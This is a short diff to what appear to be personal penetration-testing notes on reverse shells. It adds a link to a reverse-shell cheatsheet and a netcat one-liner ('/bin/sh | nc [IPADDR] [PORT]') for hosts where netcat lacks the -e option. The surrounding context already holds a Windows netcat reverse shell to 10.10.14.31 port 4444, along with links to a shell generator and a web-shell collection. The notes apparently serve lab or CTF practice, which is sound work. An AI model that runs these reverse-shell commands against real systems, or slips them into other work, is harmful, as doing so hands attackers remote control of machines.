@@ -28,10 +28,18 @@ https://github.com/mthbernardes/rsg
 
 https://github.com/jbarcia/Web-Shells/tree/master/laudanum
 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
 
 ## Netcat on windows:
 
 ```
 nc.exe -nv 10.10.14.31 4444 -e cmd.exe
 
+```
+
+## Netcat without an "-e" or "-c" option
+
+```
+/bin/sh | nc [IPADDR] [PORT]
 ```
